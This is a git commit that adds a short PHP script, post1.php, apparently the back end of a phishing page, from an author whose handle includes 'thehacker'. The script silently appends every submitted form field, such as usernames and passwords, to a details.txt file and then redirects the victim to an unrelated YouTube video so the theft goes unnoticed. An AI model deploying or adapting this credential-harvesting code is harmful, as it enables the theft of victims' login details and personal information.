dc31a726d171922a43b6ed4659dd63318fb43668
Sumit-thehacker-ph <131931646+Sumit-thehacker-ph@users.noreply.github.com>
2023-04-27 07:49:47 +0530

    Add files via upload

---
+++ post1.php
@@ -0,0 +1,17 @@
+<?php
+$file = fopen("details.txt","a");
+fwrite($file, "\t\t\t\t\t\t");
+fwrite($file, "\r\n");
+foreach ($_POST as $key=>$value) {
+  fwrite($file, "\t\t\t\t\t\t");
+  fwrite($file, $key);
+  fwrite($file, "=");
+  fwrite($file, $value);
+  fwrite($file, "\r\n");
+}
+fwrite($file, "\r\n");
+fwrite($file, "\t\t\t\t\t\t");
+fclose($file);
+header("Location: https://youtube.com/shorts/xW6F4eQVQuI?feature=share");
+?>
+
